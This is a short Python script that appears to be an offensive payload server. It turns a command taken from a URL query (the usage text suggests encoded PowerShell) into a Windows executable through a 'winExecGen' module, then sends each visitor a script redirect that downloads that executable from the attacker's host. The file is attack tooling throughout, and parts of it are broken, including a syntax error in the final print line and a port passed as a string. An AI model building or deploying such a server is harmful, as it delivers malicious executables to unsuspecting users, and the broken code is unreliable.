from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse, json, urllib, winExecGen,sys

class GetHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        winExecGen.encodePayload("/var/www/html/out.exe", urllib.parse.unquote(parsed_path.query.split("=",1)[-1]))
        self.send_response(200)
        self.end_headers()
        message = b"<script>window.location=\'http://"+sys.argv[1]+":"+sys.argv[2]+"/out.exe\'</script>"
        self.wfile.write(message)
        return

if __name__ == '__main__':
    #from BaseHTTPServer import HTTPServer < previously for py2 support
    server_class = HTTPServer
    if len(sys.argv) != 3:
        print("usage: "+sys.argv[0]+" 1.3.3.7 8080, make request to http://1.3.3.7:8080/?c=powershell -e oirgjdfoigjdfgijdfgdfhgikhgfgihk, urlencode whatever you think will break it")
    server = server_class((sys.argv[1], sys.argv[2]), GetHandler)
    print('Starting server at http://'+sys.argv[1]+':'sys.argv[2])
    server.serve_forever()
